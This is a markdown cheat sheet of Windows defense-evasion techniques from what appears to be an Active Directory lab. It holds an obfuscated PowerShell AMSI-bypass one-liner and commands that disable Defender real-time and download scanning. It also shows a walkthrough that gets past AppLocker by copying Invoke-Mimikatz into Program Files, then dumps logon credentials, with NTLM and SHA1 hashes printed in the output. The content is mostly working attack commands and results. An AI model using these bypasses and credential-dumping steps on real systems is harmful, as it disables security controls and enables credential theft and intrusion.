# Different Bypass Methods


## AMSI

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```


## AV

```powershell
#disables real time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

#indicates whether defender scans all downlaoded files and attachments
Set-MpPreference -DisableIOAVProtection $true
```

## Applocker

If you recieve an error on language mode, applocker is configured on the server we are connecting to and we drop into a constrained language mode when powershell remoting
this also means scripts cannot be run using dot sourcing
Add 'Invoke-Mimikatz' to the end of the script

```powershell
PS C:\ad\tools> Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
Cannot invoke method. Method invocation is supported only on core types in this language mode.
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
    + PSComputerName        : adminsrv.abc.example.local
```

From here enter a ps session and enumerate the applocker policy to see where scripts can be executed from




```powershell
PS C:\ad\tools> Enter-PSSession adminsrv.abc.example.local
[adminsrv.abc.example.local]: PS C:\Users\svcadmin\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
[adminsrv.abc.example.local]: PS C:\Users\svcadmin\Documents> Get-ApplockerPolicy -Effective | select -Ex
pandProperty RuleCollections


PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```


Disable real-time monitoring

```powershell
[adminsrv.abc.example.local]: PS C:\Users\svcadmin\Documents> Set-MpPreference -DisableRealtimeMonitoring
 $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
```

copy the script from the local server to the destination in the applocker rules

```powershell
PS C:\AD\Tools> copy-item .\Invoke-Mimikatz.ps1 \\adminsrv.abc.example.local\c$\'Program Files'
```

Then in a remote PS Session

```powershell
[adminsrv.abc.example.local]: PS C:\Users\svcadmin\Documents> cd \'Program Files'
[adminsrv.abc.example.local]: PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                Common Files
d-----        7/16/2016   6:18 AM                internet explorer
d-----        9/15/2021   3:35 AM                Windows Defender
d-----        7/16/2016   6:18 AM                WindowsPowerShell
-a----        9/29/2021   3:55 AM        3668264 Invoke-Mimikatz.ps1


[adminsrv.abc.example.local]: PS C:\Program Files> .\Invoke-MimikatzEx.ps1

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ADMINSRV$
Domain            : example
Logon Server      : (null)
Logon Time        : 1/31/2022 2:51:33 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : ADMINSRV$
         * Domain   : example
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
```
